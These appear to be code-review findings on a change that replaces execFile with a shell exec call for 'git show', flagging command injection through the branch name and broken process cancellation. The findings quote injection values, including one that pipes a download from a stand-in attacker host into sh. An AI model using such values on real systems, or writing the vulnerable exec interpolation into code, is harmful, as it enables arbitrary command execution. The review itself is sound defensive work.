findings.title: [P1] Pass the branch as a separate argument
findings.body: When `branch` contains shell syntax, `exec()` passes it through the platform shell. For example, `HEAD; id` executes an additional command with the application's privileges. Retain `execFile("git", ["show", branch])` so the branch remains one literal argument.

findings.title: [P2] Preserve direct-child cancellation semantics
findings.body: Killing the returned `ChildProcess` now targets the intermediate shell rather than reliably terminating the `git` process it launched. This can leave a long-running `git show` alive after cancellation; `execFile()` made Git the direct child.

findings.title: [P2] Keep `git` as the direct child so cancellation terminates it
findings.body:
On Windows, `exec()` returns the intermediate `cmd.exe` process. If a caller invokes `showBranch(branch).kill()` while `git show` is processing a large repository or slow filesystem, only the shell is terminated and `git.exe` can continue running. The previous `execFile()` implementation killed `git` directly.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
`exec` invokes a shell, so caller-controlled input such as `HEAD;id` executes an additional command. Valid branch names containing shell metacharacters can also fail or be misinterpreted; `execFile("git", ["show", branch])` preserved the argument boundary.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch argument out of the shell command
findings.body:
`exec()` invokes a shell and interpolates `branch` without escaping. Any caller-controlled branch value such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. The previous `execFile()` implementation passed the branch as a literal argument and was not vulnerable.

_Recommend validating this comment independently._

findings.title: [P1] Avoid passing the branch name through a shell
findings.body:
Any caller-controlled branch containing shell syntax executes additional processes. For example, `"HEAD; yes >/dev/null"` starts an indefinitely running CPU-consuming process, whereas the previous `execFile` call treated the entire value as one Git argument.

_Recommend validating this comment independently._
